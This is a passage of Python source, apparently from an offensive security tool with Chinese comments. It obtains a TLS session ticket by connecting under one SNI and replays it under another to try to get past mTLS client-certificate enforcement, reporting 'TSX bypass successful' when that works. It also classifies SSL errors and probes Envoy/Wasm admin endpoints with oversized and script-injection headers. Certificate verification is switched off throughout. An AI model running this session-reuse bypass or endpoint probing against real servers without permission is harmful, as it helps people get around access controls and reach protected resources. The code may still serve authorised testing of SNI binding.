            ctx.set_options(SSL.OP_NO_SSLv2 | SSL.OP_NO_SSLv3)
            ctx.set_session_cache_mode(SSL.SESS_CACHE_CLIENT)
            
            # 创建socket连接
            sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
            
            # 创建SSL连接
            ssl_conn = SSL.Connection(ctx, sock)
            ssl_conn.set_tlsext_host_name(weak_sni.encode('utf-8'))
            ssl_conn.set_connect_state()
            
            # print(f"[*] 正在为SNI '{weak_sni}' 尝试握手...")
            handshake_steps = 0
            
            # 核心修正：使用安全的握手函数
            try:
                safe_do_handshake(ssl_conn, weak_sni, self.timeout)
                handshake_ok = True
            except Exception as e:
                raise Exception(f"Handshake failed for {weak_sni}: {e}")
            
            # 计算握手RTT
            handshake_rtt = (time.perf_counter() - handshake_start) * 1000
            
            # 收集SSL握手信息
            ssl_info = {
                'cipher': ssl_conn.get_cipher_name(),
                'version': ssl_conn.get_protocol_version_name(),
                'peer_cert_chain': len(ssl_conn.get_peer_cert_chain()) if ssl_conn.get_peer_cert_chain() else 0
            }
            
            # 发送HTTP请求获取应用层响应摘要
            app_response_start = time.perf_counter()
            try:
                http_request = f"GET / HTTP/1.1\r\nHost: {weak_sni}\r\nUser-Agent: Mozilla/5.0 (TSX-Probe)\r\nConnection: close\r\n\r\n"
                ssl_conn.send(http_request.encode())
                
                response_data = b""
                while True:
                    try:
                        chunk = ssl_conn.recv(4096)
                        if not chunk:
                            break
                        response_data += chunk
                        if len(response_data) > 8192:
                            break
                    except:
                        break
                
                app_response_time = (time.perf_counter() - app_response_start) * 1000
                
                response_text = response_data.decode('utf-8', errors='ignore')
                response_lines = response_text.split('\r\n')
                status_line = response_lines[0] if response_lines else ""
                
                headers_summary = {}
                for line in response_lines[1:]:
                    if ':' in line and line.strip():
                        key, value = line.split(':', 1)
                        key = key.strip().lower()
                        if key in ['server', 'content-type', 'content-length', 'set-cookie', 'location']:
                            headers_summary[key] = value.strip()[:100]
                
                app_layer_summary = {
                    'status_line': status_line[:100],
                    'response_time_ms': round(app_response_time, 2),
                    'response_size': len(response_data),
                    'key_headers': headers_summary,
                    'body_preview': response_text[response_text.find('\r\n\r\n')+4:][:200] if '\r\n\r\n' in response_text else ""
                }
                
            except Exception as e:
                app_layer_summary = {'error': f'HTTP probe failed: {str(e)}'}

            #  关键突破：使用pyOpenSSL获取session
            session = ssl_conn.get_session()
           #print(f"[DEBUG] Session reused during probe: {ssl_conn.session_reused()}")  #操你妈畜生BUG 太难找了
            # print(f"[DEBUG] Session object: {session}")

            if session:
                self.session_ticket = session
                print(f"[+] Session ticket obtained from {weak_sni} (pyOpenSSL)")
                print(f"    ├─ Handshake RTT: {handshake_rtt:.1f}ms")
                print(f"    ├─ SSL Version: {ssl_info['version']}, Cipher: {ssl_info['cipher']}")
                print(f"    ├─ App Response: {app_layer_summary.get('status_line', 'N/A')} ({app_layer_summary.get('response_time_ms', 0):.1f}ms)")
                print(f"    └─ Server: {app_layer_summary.get('key_headers', {}).get('server', 'Unknown')}")
                
                session_data = {
                    'session': session,
                    'ssl_library': 'pyOpenSSL',
                    'weak_sni': weak_sni,
                    'timestamp': time.time(),
                    'forensics': {
                        'handshake_rtt_ms': round(handshake_rtt, 2),
                        'ssl_info': ssl_info,
                        'app_layer_summary': app_layer_summary,
                        'probe_quality': 'pyOpenSSL_enhanced'
                    }
                }
                self._dump_session(weak_sni, session_data)
                return True

            else:
                print(f"[-] 无法获取session ticket from {weak_sni} - 服务端可能不支持或本次未下发")
                return False

        except SSL.Error as e:
            # print(f"[!] SNI '{weak_sni}' 握手失败: {e}")
            return False
            
        except Exception as e:
            import traceback
            # print(f"[-] pyOpenSSL probe failed with a critical exception.")
            # print("--- TRACEBACK START ---")
            # traceback.print_exc()
            # print("--- TRACEBACK END ---")
            return False
            
        finally:
            if ssl_conn and handshake_ok:
                try:
                    ssl_conn.shutdown()
                except SSL.Error:
                    pass
            if sock:
                sock.close()
    
    async def _fallback_probe_weak_sni(self, weak_sni):
        """备用版本 - 标准库ssl实现（完善：获取并验证可复用的会话）"""
        print(f"[!] Using fallback SSL library for {weak_sni}")
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # 第一次握手：获取 session
            t0 = time.perf_counter()
            sock1 = socket.create_connection((self.target_host, self.target_port), self.timeout)
            ssock1 = context.wrap_socket(sock1, server_hostname=weak_sni)
            t1 = time.perf_counter()
            session = getattr(ssock1, 'session', None)
            base_time_ms = (t1 - t0) * 1000
            if not session:
                ssock1.close()
                print(f"[-] No session obtained from {weak_sni}")
                return False
            ssock1.close()
            
            # 第二次握手：尝试复用该 session（注：标准库不保证提供 session_reused 指示）
            t2 = time.perf_counter()
            sock2 = socket.create_connection((self.target_host, self.target_port), self.timeout)
            try:
                ssock2 = context.wrap_socket(sock2, server_hostname=weak_sni, session=session)
                t3 = time.perf_counter()
                reuse_time_ms = (t3 - t2) * 1000
            finally:
                try:
                    ssock2.close()
                except Exception:
                    pass
            
            # 证据：如果二次握手耗时明显降低，作为“可能已复用”的证据，但不作强结论
            evidence = {
                'first_handshake_ms': round(base_time_ms, 2),
                'second_handshake_ms': round(reuse_time_ms, 2),
                'reduction_ms': round(base_time_ms - reuse_time_ms, 2)
            }
            self._dump_session(weak_sni, {
                'session': session,
                'timestamp': time.time(),
                'ssl_library': 'stdlib',
                'evidence': evidence
            })
            logger.info(f"Fallback session obtained and tested from %s (%s)", weak_sni, evidence)
            return True
        except Exception as e:
            logger.warning(f"Fallback probe failed: {e}")
            return False
    
    async def attack_strong_sni(self, strong_sni, weak_sni=None):
        """带票据攻击强门 - pyOpenSSL版本"""
        
        # 如果指定了weak_sni，尝试从session池加载
        if weak_sni:
            session_data = self._load_session(weak_sni)
            if session_data:
                session_ticket = session_data['session']
                ssl_library = session_data.get('ssl_library', 'unknown')
                print(f"[+] Using session from pool: {weak_sni} -> {strong_sni} (via {ssl_library})")
            else:
                return False, f"No session available for {weak_sni}"
        else:
            session_ticket = self.session_ticket
            
        if not session_ticket:
            return False, "No session ticket available"
        
        # 选择SSL库实现
        if not PYOPENSSL_AVAILABLE:
            return await self._fallback_attack_strong_sni(strong_sni, session_ticket)
        
        # 使用asyncio.to_thread执行阻塞的pyOpenSSL操作
        return await asyncio.to_thread(self._sync_attack_strong_sni, strong_sni, session_ticket)
    
    def _sync_attack_strong_sni(self, strong_sni, session_ticket):
        """同步版本 - pyOpenSSL实现"""
        try:
            start_time = time.perf_counter()
            
            #  关键突破：创建全新的pyOpenSSL上下文 - 修复：强制TLS版本并启用客户端session缓存
            ctx = SSL.Context(SSL.TLSv1_2_METHOD)  # 强制TLS 1.2
            ctx.set_verify(SSL.VERIFY_NONE, lambda c, x, e, d, ok: True)
            ctx.set_options(SSL.OP_NO_SSLv2 | SSL.OP_NO_SSLv3)
            # 关键修复：启用客户端session缓存（pyOpenSSL正确方法）
            ctx.set_session_cache_mode(SSL.SESS_CACHE_CLIENT)
            
            # 创建socket连接
            sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
            
            # 创建SSL连接
            ssl_conn = SSL.Connection(ctx, sock)
            ssl_conn.set_tlsext_host_name(strong_sni.encode('utf-8'))
            ssl_conn.set_connect_state()
            
            #  核心突破：设置从弱门获取的session！
            ssl_conn.set_session(session_ticket)
            
            # 执行握手（使用安全函数）
            safe_do_handshake(ssl_conn, strong_sni, self.timeout)
            
            handshake_time = (time.perf_counter() - start_time) * 1000
            
            #  检查session是否成功复用（健壮推断）
            resumed = False
            try:
                if hasattr(ssl_conn, 'session_reused'):
                    resumed = bool(ssl_conn.session_reused())
            except Exception:
                resumed = False
            
            print(f"[*] Session reuse status: {resumed}")
            print(f"[*] Handshake time: {handshake_time:.1f}ms")
            
            # 增强检测：分析TLS握手和应用层响应
            bypass_detected = False
            bypass_evidence = []
            
            if resumed:
                bypass_evidence.append("Session successfully resumed (pyOpenSSL)")
                bypass_detected = True
                
                # 检测1：尝试HTTP请求，看是否能访问受保护资源
                try:
                    # 发送简单HTTP请求测试权限
                    test_request = f"GET / HTTP/1.1\r\nHost: {strong_sni}\r\nConnection: close\r\n\r\n"
                    ssl_conn.send(test_request.encode())
                    response = ssl_conn.recv(4096).decode('utf-8', errors='ignore')
                    
                    # 分析响应状态码
                    if 'HTTP/1.1 200' in response or 'HTTP/2' in response:
                        bypass_evidence.append("HTTP 200 response received")
                        print(f"[+]  TSX SUCCESS: HTTP access granted!")
                    elif 'HTTP/1.1 401' in response or 'HTTP/1.1 403' in response:
                        bypass_evidence.append("HTTP auth required - mTLS properly enforced")
                        bypass_detected = False
                    else:
                        bypass_evidence.append(f"Unexpected response: {response[:100]}")
                        
                except Exception as e:
                    bypass_evidence.append(f"HTTP test failed: {e}")
                
                # 检测2：快速握手检测
                if handshake_time < 200:  # 快速握手可能跳过了验证
                    bypass_evidence.append(f"Fast handshake ({handshake_time:.1f}ms)")
                
            ssl_conn.close()
            
            # 判断是否检测到绕过
            if bypass_detected and resumed:
                evidence_str = "; ".join(bypass_evidence)
                return True, f" TSX bypass successful: {evidence_str}"
            elif resumed:
                evidence_str = "; ".join(bypass_evidence)
                return False, f"Session resumed but mTLS enforced: {evidence_str}"
            else:
                return False, "Session not resumed"
                
        except SSL.Error as ssl_err:
            # 精准错误分类
            error_type, confidence = self._classify_ssl_error(ssl_err, strong_sni)
            
            # 增强调试信息
            error_details = []
            if hasattr(ssl_err, 'args'):
                error_details.append(f"Args: {ssl_err.args}")
            if hasattr(ssl_err, 'reason'):
                error_details.append(f"Reason: {ssl_err.reason}")
            if hasattr(ssl_err, 'library'):
                error_details.append(f"Library: {ssl_err.library}")
            if hasattr(ssl_err, 'function'):
                error_details.append(f"Function: {ssl_err.function}")
            
            # SSL error details captured
            
            return False, {
                'success': False,
                'error_classification': error_type,
                'confidence': confidence,
                'evidence': str(ssl_err),
                'conclusion': self._generate_conclusion(error_type)
            }
        except Exception as e:
            import traceback
            # pyOpenSSL exception handled
            # Traceback captured
            return False, f"pyOpenSSL connection failed: {e}"
    
    def _classify_ssl_error(self, ssl_err, target_sni):
        """精准分类SSL错误原因 - 增强版"""
        error_msg = str(ssl_err).lower()
        
        # 增强调试 - 打印原始错误对象
        # Classify SSL error type
        # SSL error type identified
        
        # 尝试获取更详细的错误信息
        error_details = []
        
        # 检查各种可能的错误属性
        if hasattr(ssl_err, 'args') and ssl_err.args:
            error_details.extend([str(arg).lower() for arg in ssl_err.args])
            # Process error args
        
        if hasattr(ssl_err, 'reason'):
            error_details.append(str(ssl_err.reason).lower())
            # Process error reason
            
        if hasattr(ssl_err, 'library'):
            error_details.append(f"lib:{ssl_err.library}")
            # Process error library
            
        if hasattr(ssl_err, 'function'):
            error_details.append(f"func:{ssl_err.function}")
            # Process error function
        
        # 对于pyOpenSSL.SSL.Error，尝试获取更多信息
        if hasattr(ssl_err, 'get_error_code'):
            try:
                error_code = ssl_err.get_error_code()
                error_details.append(f"code:{error_code}")
                # Process error code
            except:
                pass
        
        # 合并所有错误信息
        full_error_context = " ".join([error_msg] + error_details)
        # Full error context processed
        
        # SNI绑定防御的明确指标（增强版 - 精准捕获SNI相关失败）
        sni_binding_indicators = [
            'unrecognized_name',
            'illegal_parameter', 
            'handshake_failure',
            'certificate_unknown',
            'sni mismatch',
            'hostname mismatch',
            'no server name indication',
            'tlsv1 unrecognized name',
            'ssl3_get_server_hello',
            # 新增精准SNI绑定检测指示器
            'bad_certificate',
            'certificate does not match',
            'certificate verify failed',
            'name not in cert',
            'certificate doesn\'t match hostname',
            'ssl certificate problem',
            'ssl certificate verify failed',
            'ssl: server certificate verification failed',
            'certificate verify failed: hostname mismatch',
            'no certificate matches the given hostname',
            'handshake failed: ssl certificate verify failed',
            'ssl_error_ssl: certificate verify failed',
            'alert bad certificate',
            'ssl error: certificate verify failed: hostname mismatch',
            'sslv3 alert handshake failure',
            'ssl routines:ssl3_get_record:wrong version number',
            'ssl: wrong version number',
            'servername mismatch'
        ]
        
        # 证书验证问题指标（已排除SNI绑定相关项，避免误分类）
        cert_validation_indicators = [
            'certificate required',
            'self signed certificate',
            'unable to get local issuer certificate',
            'certificate has expired',
            'certificate chain too long',
            'cert_chain_too_long',
            'certificate authority invalid',
            'ca cert invalid',
            'certificate not trusted',
            'certificate chain invalid'
        ]
        
        # 网络层问题指标
        network_indicators = [
            'connection reset',
            'connection refused', 
            'timeout',
            'broken pipe',
            'network unreachable',
            'connection aborted',
            'econnreset',
            'epipe'
        ]
        
        # mTLS特定错误
        mtls_indicators = [
            'peer did not return a certificate',
            'certificate required',
            'no client certificate',
            'ssl3_read_bytes',
            'ssl_verify_cert_chain'
        ]
        
        # Session相关错误
        session_indicators = [
            'session id context uninitialized',
            'session not resumable',
            'session id mismatch',
            'bad session id',
            'session_id_context'
        ]
        
        # TLS版本/协议错误
        protocol_indicators = [
            'unsupported protocol',
            'wrong version number',
            'tlsv1 alert protocol version',
            'ssl3 alert handshake failure',
            'inappropriate fallback'
        ]
        
        # 首先检查特定的错误类型
        if "WantReadError" in str(type(ssl_err).__name__):
            return "IO_WAIT_ERROR", "Confirmed - SSL layer awaiting more data"
        elif "WantWriteError" in str(type(ssl_err).__name__):
            return "IO_WAIT_ERROR", "Confirmed - SSL layer waiting to send data"
        elif "WantX509LookupError" in str(type(ssl_err).__name__):
            return "CERT_LOOKUP_PENDING", "Confirmed - Certificate lookup in progress"
        
        # 检查所有指标
        elif any(indicator in full_error_context for indicator in sni_binding_indicators):
            return "SNI_BINDING_DEFENSE", "Confirmed"
        elif any(indicator in full_error_context for indicator in session_indicators):
            return "SESSION_VALIDATION_FAILURE", "Confirmed"
        elif any(indicator in full_error_context for indicator in protocol_indicators):
            return "PROTOCOL_MISMATCH", "Likely"
        elif any(indicator in full_error_context for indicator in mtls_indicators):
            return "MTLS_ENFORCEMENT", "Confirmed"
        elif any(indicator in full_error_context for indicator in cert_validation_indicators):
            return "CERT_VALIDATION_FAILURE", "Confirmed"
        elif any(indicator in full_error_context for indicator in network_indicators):
            return "NETWORK_ISSUE", "Confirmed"
        else:
            # 如果无法分类，返回更详细的信息
            return "UNKNOWN_SSL_ERROR", f"Inconclusive (raw: {full_error_context[:100]})"
    
    def _generate_conclusion(self, error_type):
        """根据错误类型生成结论"""
        conclusions = {
            "SNI_BINDING_DEFENSE": "Server properly validates SNI binding - TSX attack blocked",
            "MTLS_ENFORCEMENT": "mTLS properly enforced - requires client certificate",
            "CERT_VALIDATION_FAILURE": "Certificate validation working - invalid certs rejected",
            "NETWORK_ISSUE": "Network connectivity problem - not a security control",
            "SESSION_VALIDATION_FAILURE": "Server validates session context - session reuse attack blocked",
            "PROTOCOL_MISMATCH": "TLS protocol negotiation failed - likely version incompatibility",
            "IO_WAIT_ERROR": "SSL handshake incomplete - server requires more data (likely secure)",
            "CERT_LOOKUP_PENDING": "Certificate verification in progress - delayed validation",
            "UNKNOWN_SSL_ERROR": "Unclassified SSL error - requires manual investigation"
        }
        return conclusions.get(error_type, "Unknown error type")
    
    # [已移除] detect_wasm_runtime_characteristics 及其相关方法
    # 这些方法已迁移到 wasm_runtime_analyzer.py 中的 WasmRuntimeAnalyzer 类
    
    async def _deprecated_wasm_method(self, weak_sni=None, strong_sni=None):
        """[已弃用] 原detect_wasm_runtime_characteristics方法 - 应使用WasmRuntimeAnalyzer"""
        # 这个方法已被错误地命名为run_tsx_attack，现在重命名为避免冲突
        # 建议使用专门的 WasmRuntimeAnalyzer 类
        try:
            wasm_indicators = {
                'response_timing_analysis': {},
                'plugin_detection': {},
                'runtime_characteristics': {},
                'security_features': {}
            }
            
            # 1. 通过响应时序分析检测Wasm处理
            timing_analysis = await self._analyze_wasm_timing_patterns()
            wasm_indicators['response_timing_analysis'] = timing_analysis
            
            # 2. 插件特征检测
            plugin_detection = await self._detect_wasm_plugins()
            wasm_indicators['plugin_detection'] = plugin_detection
            
            # 3. 运行时特征分析
            runtime_analysis = await self._analyze_runtime_characteristics()
            wasm_indicators['runtime_characteristics'] = runtime_analysis
            
            # 4. 安全沙箱检测
            sandbox_analysis = await self._test_wasm_sandbox_isolation()
            wasm_indicators['security_features'] = sandbox_analysis
            
            # 综合判断Wasm使用情况
            wasm_assessment = self._assess_wasm_usage(wasm_indicators)
            
            return {
                'wasm_detected': wasm_assessment['detected'],
                'confidence': wasm_assessment['confidence'],
                'runtime_type': wasm_assessment['runtime_type'],
                'wasm_features': wasm_assessment['features'],
                'security_implications': wasm_assessment['security_implications'],
                'attack_surface': wasm_assessment['attack_surface'],
                'detailed_indicators': wasm_indicators
            }
            
        except Exception as e:
            return {
                'wasm_detected': False,
                'confidence': 0,
                'runtime_type': 'Unknown',
                'wasm_features': [],
                'security_implications': [f"Wasm detection failed: {e}"],
                'attack_surface': [],
                'detailed_indicators': {}
            }
    
    async def _analyze_wasm_timing_patterns(self) -> Dict:
        """通过时序分析检测Wasm处理特征"""
        try:
            # Wasm编译和执行会有特定的时序模式
            timing_tests = []
            
            # 测试1: 初次请求vs后续请求（Wasm编译缓存）
            print(f"[*] Testing Wasm compilation caching patterns...")
            first_request_time = await self._measure_complex_request_time("/", headers={'X-Wasm-Test': 'complex-operation'})
            await asyncio.sleep(0.5)  # 短暂间隔
            second_request_time = await self._measure_complex_request_time("/", headers={'X-Wasm-Test': 'complex-operation'})
            
            # 如果第二次请求明显更快，可能是Wasm编译缓存
            caching_ratio = first_request_time / second_request_time if second_request_time > 0 else 1
            
            timing_tests.append({
                'test': 'compilation_caching',
                'first_request': first_request_time,
                'second_request': second_request_time,
                'caching_ratio': caching_ratio,
                'likely_wasm_caching': caching_ratio > 1.3  # 第二次请求快30%以上
            })
            
            # 测试2: 复杂处理vs简单处理的时间差
            print(f"[*] Testing processing complexity patterns...")
            simple_time = await self._measure_complex_request_time("/", headers={'X-Test': 'simple'})
            complex_time = await self._measure_complex_request_time("/favicon.ico", headers={'X-Test': 'complex'})
            
            complexity_ratio = complex_time / simple_time if simple_time > 0 else 1
            
            timing_tests.append({
                'test': 'processing_complexity',
                'simple_request': simple_time,
                'complex_request': complex_time,
                'complexity_ratio': complexity_ratio,
                'processing_overhead': complexity_ratio > 1.5  # 复杂请求慢50%以上
            })
            
            return {
                'timing_tests': timing_tests,
                'wasm_timing_detected': any(test.get('likely_wasm_caching', False) for test in timing_tests),
                'evidence': f"Tested {len(timing_tests)} timing patterns"
            }
            
        except Exception as e:
            return {
                'timing_tests': [],
                'wasm_timing_detected': False,
                'evidence': f"Timing analysis failed: {e}"
            }
    
    async def _measure_complex_request_time(self, path: str, headers: Dict = None) -> float:
        """测量复杂请求的响应时间"""
        try:
            start_time = time.perf_counter()
            
            if self.target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    proxy_open_connection(PROXY_URL, self.target_host, self.target_port, ssl_context=ctx, server_hostname=self.target_host) if PROXY_ENABLED and PROXY_AVAILABLE else asyncio.open_connection(self.target_host, self.target_port, ssl=ctx),
                    timeout=self.timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    proxy_open_connection(PROXY_URL, self.target_host, self.target_port) if PROXY_ENABLED and PROXY_AVAILABLE else asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
            
            # 构造请求
            request_lines = [f"GET {path} HTTP/1.1", f"Host: {self.target_host}"]
            if headers:
                for key, value in headers.items():
                    request_lines.append(f"{key}: {value}")
            request_lines.extend(["Connection: close", "", ""])
            
            request = "\r\n".join(request_lines)
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
            
            writer.close()
            await writer.wait_closed()
            
            return (time.perf_counter() - start_time) * 1000
            
        except Exception:
            return 0.0
    
    async def _detect_wasm_plugins(self) -> Dict:
        """检测Wasm插件特征"""
        try:
            plugin_indicators = []
            
            # 1. 检测常见的Wasm插件响应头
            wasm_headers = await self._test_wasm_response_headers()
            if wasm_headers['detected']:
                plugin_indicators.extend(wasm_headers['indicators'])
            
            # 2. 检测插件特有的错误响应
            plugin_errors = await self._test_plugin_error_responses()
            if plugin_errors['detected']:
                plugin_indicators.extend(plugin_errors['indicators'])
            
            # 3. 检测插件配置端点
            config_endpoints = await self._probe_plugin_config_endpoints()
            if config_endpoints['detected']:
                plugin_indicators.extend(config_endpoints['indicators'])
            
            return {
                'detected': len(plugin_indicators) > 0,
                'indicators': plugin_indicators,
                'wasm_headers': wasm_headers,
                'plugin_errors': plugin_errors,
                'config_endpoints': config_endpoints,
                'evidence': f"Found {len(plugin_indicators)} plugin indicators"
            }
            
        except Exception as e:
            return {
                'detected': False,
                'indicators': [],
                'evidence': f"Plugin detection failed: {e}"
            }
    
    async def _test_wasm_response_headers(self) -> Dict:
        """测试Wasm插件相关的响应头"""
        try:
            # 发送可能触发Wasm插件的请求
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
            if self.target_port == 443:
                ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                
                request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: WasmDetector/1.0\r\nConnection: close\r\n\r\n"
                ssock.send(request.encode())
                response = ssock.recv(2048).decode('utf-8', errors='ignore')
                ssock.close()
            else:
                request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: WasmDetector/1.0\r\nConnection: close\r\n\r\n"
                sock.send(request.encode())
                response = sock.recv(2048).decode('utf-8', errors='ignore')
                sock.close()
            
            # 检查Wasm相关头部
            wasm_header_patterns = [
                'x-wasm-', 'x-envoy-', 'x-plugin-', 'wasm-', 'envoy-wasm'
            ]
            
            found_headers = []
            for line in response.split('\r\n'):
                if ':' in line:
                    header_name = line.split(':')[0].lower()
                    for pattern in wasm_header_patterns:
                        if pattern in header_name:
                            found_headers.append(line.strip())
                            break
            
            return {
                'detected': len(found_headers) > 0,
                'indicators': found_headers,
                'response_preview': response[:500]
            }
            
        except Exception as e:
            return {
                'detected': False,
                'indicators': [],
                'response_preview': '',
                'error': str(e)
            }
    
    async def _test_plugin_error_responses(self) -> Dict:
        """测试插件特有的错误响应"""
        try:
            # 发送可能触发插件错误的请求
            error_paths = [
                '/wasm-test', '/.well-known/wasm', '/admin/wasm',
                '/envoy/wasm', '/plugin/status'
            ]
            
            plugin_errors = []
            
            for path in error_paths[:3]:  # 限制测试数量
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                    sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
                    if self.target_port == 443:
                        ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                        
                        request = f"GET {path} HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                        ssock.send(request.encode())
                        response = ssock.recv(1024).decode('utf-8', errors='ignore')
                        ssock.close()
                    else:
                        request = f"GET {path} HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                        sock.send(request.encode())
                        response = sock.recv(1024).decode('utf-8', errors='ignore')
                        sock.close()
                    
                    # 检查Wasm相关错误信息
                    wasm_error_patterns = [
                        'wasm', 'webassembly', 'envoy', 'plugin', 'runtime'
                    ]
                    
                    found_patterns = [pattern for pattern in wasm_error_patterns if pattern in response.lower()]
                    
                    if found_patterns:
                        plugin_errors.append({
                            'path': path,
                            'patterns': found_patterns,
                            'response_preview': response[:200]
                        })
                        
                except Exception:
                    continue
            
            return {
                'detected': len(plugin_errors) > 0,
                'indicators': plugin_errors,
                'evidence': f"Tested {len(error_paths)} error paths"
            }
            
        except Exception as e:
            return {
                'detected': False,
                'indicators': [],
                'evidence': f"Plugin error testing failed: {e}"
            }
    
    async def _probe_plugin_config_endpoints(self) -> Dict:
        """探测插件配置端点"""
        try:
            # 常见的插件管理端点
            config_endpoints = [
                '/admin/config_dump', '/stats/prometheus', '/clusters',
                '/listeners', '/config', '/runtime'
            ]
            
            accessible_endpoints = []
            
            for endpoint in config_endpoints[:3]:  # 限制测试数量
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                    sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
                    if self.target_port == 443:
                        ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                        
                        request = f"GET {endpoint} HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                        ssock.send(request.encode())
                        response = ssock.recv(1024).decode('utf-8', errors='ignore')
                        ssock.close()
                    else:
                        request = f"GET {endpoint} HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                        sock.send(request.encode())
                        response = sock.recv(1024).decode('utf-8', errors='ignore')
                        sock.close()
                    
                    # 检查是否返回配置信息
                    if response and '200 OK' in response:
                        accessible_endpoints.append({
                            'endpoint': endpoint,
                            'accessible': True,
                            'response_preview': response[:200]
                        })
                        
                except Exception:
                    continue
            
            return {
                'detected': len(accessible_endpoints) > 0,
                'indicators': accessible_endpoints,
                'evidence': f"Found {len(accessible_endpoints)} accessible config endpoints"
            }
            
        except Exception as e:
            return {
                'detected': False,
                'indicators': [],
                'evidence': f"Config endpoint probing failed: {e}"
            }
    
    async def _analyze_runtime_characteristics(self) -> Dict:
        """分析运行时特征"""
        try:
            runtime_features = {}
            
            # 1. 内存使用模式分析（通过连续请求观察）
            memory_pattern = await self._analyze_memory_patterns()
            runtime_features['memory_patterns'] = memory_pattern
            
            # 2. 启动时间分析
            startup_analysis = await self._analyze_startup_characteristics()
            runtime_features['startup_characteristics'] = startup_analysis
            
            return {
                'features': runtime_features,
                'wasm_runtime_detected': any(
                    feature.get('wasm_indicators', False) 
                    for feature in runtime_features.values() 
                    if isinstance(feature, dict)
                )
            }
            
        except Exception as e:
            return {
                'features': {},
                'wasm_runtime_detected': False,
                'error': str(e)
            }
    
    async def _analyze_memory_patterns(self) -> Dict:
        """分析内存使用模式"""
        try:
            # 通过多次请求观察响应时间变化，推断内存管理模式
            response_times = []
            
            for i in range(5):
                start_time = time.perf_counter()
                
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
                if self.target_port == 443:
                    ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                    
                    request = f"GET /?test={i} HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                    ssock.send(request.encode())
                    response = ssock.recv(512)
                    ssock.close()
                else:
                    request = f"GET /?test={i} HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                    sock.send(request.encode())
                    response = sock.recv(512)
                    sock.close()
                
                response_time = (time.perf_counter() - start_time) * 1000
                response_times.append(response_time)
                
                await asyncio.sleep(0.2)
            
            # 分析时间模式
            if len(response_times) >= 3:
                avg_time = sum(response_times) / len(response_times)
                time_variance = max(response_times) - min(response_times)
                
                # Wasm可能有GC或内存管理导致的周期性延迟
                has_pattern = time_variance > avg_time * 0.3
                
                return {
                    'response_times': response_times,
                    'average_time': avg_time,
                    'time_variance': time_variance,
                    'wasm_indicators': has_pattern,
                    'evidence': f"Time variance: {time_variance:.1f}ms (avg: {avg_time:.1f}ms)"
                }
            
            return {
                'response_times': response_times,
                'wasm_indicators': False,
                'evidence': 'Insufficient data for pattern analysis'
            }
            
        except Exception as e:
            return {
                'response_times': [],
                'wasm_indicators': False,
                'evidence': f"Memory pattern analysis failed: {e}"
            }
    
    async def _analyze_startup_characteristics(self) -> Dict:
        """分析启动特征"""
        # 简化实现，实际中可以通过多种方式检测
        return {
            'startup_delay_detected': False,
            'evidence': 'Startup analysis requires longer observation period'
        }
    
    async def _test_wasm_sandbox_isolation(self) -> Dict:
        """测试Wasm沙箱隔离特征"""
        try:
            # 测试是否有沙箱特征（通过错误响应推断）
            sandbox_tests = []
            
            # 测试1: 发送可能导致沙箱错误的请求
            malformed_requests = [
                {'path': '/', 'header': 'X-Test-Overflow', 'value': 'A' * 10000},
                {'path': '/', 'header': 'X-Test-Injection', 'value': '<script>test</script>'},
            ]
            
            for test_req in malformed_requests:
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                    sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
                    if self.target_port == 443:
                        ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                        
                        request = f"GET {test_req['path']} HTTP/1.1\r\nHost: {self.target_host}\r\n{test_req['header']}: {test_req['value']}\r\nConnection: close\r\n\r\n"
                        ssock.send(request.encode())
                        response = ssock.recv(1024).decode('utf-8', errors='ignore')
                        ssock.close()
                    else:
                        request = f"GET {test_req['path']} HTTP/1.1\r\nHost: {self.target_host}\r\n{test_req['header']}: {test_req['value']}\r\nConnection: close\r\n\r\n"
                        sock.send(request.encode())
                        response = sock.recv(1024).decode('utf-8', errors='ignore')
                        sock.close()
                    
                    # 检查沙箱相关的错误信息
                    sandbox_indicators = ['sandbox', 'wasm', 'isolation', 'runtime']
                    found_indicators = [ind for ind in sandbox_indicators if ind in response.lower()]
                    
                    sandbox_tests.append({
                        'test': test_req['header'],
                        'sandbox_indicators': found_indicators,
                        'response_preview': response[:200]
                    })
                    
                except Exception:
                    continue
            
            return {
                'sandbox_detected': any(test.get('sandbox_indicators') for test in sandbox_tests),
                'tests': sandbox_tests,
                'evidence': f"Performed {len(sandbox_tests)} sandbox tests"
            }
            
        except Exception as e:
            return {
                'sandbox_detected': False,
                'tests': [],
